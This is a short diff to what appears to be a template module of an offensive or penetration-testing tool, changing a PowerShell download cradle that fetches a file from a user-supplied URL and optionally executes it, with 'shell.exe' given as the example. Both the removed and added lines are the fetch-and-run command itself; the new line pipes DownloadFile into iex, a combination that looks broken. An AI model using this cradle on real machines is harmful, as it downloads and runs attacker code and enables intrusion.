@@ -7,4 +7,4 @@ Options:
     execute: "Execute downloaded file? (Ex. y = yes / n = no)"
     filename: "Filename to execute (Ex:shell.exe)"
 ##########
-iex (New-Object Net.WebClient).DownloadString('{{url}}'{% if execute %}, '{{filename}}'{% endif %});
+iex (New-Object Net.WebClient).DownloadFile('{{url}}'{% if execute %}, '{{filename}}'{% endif %});
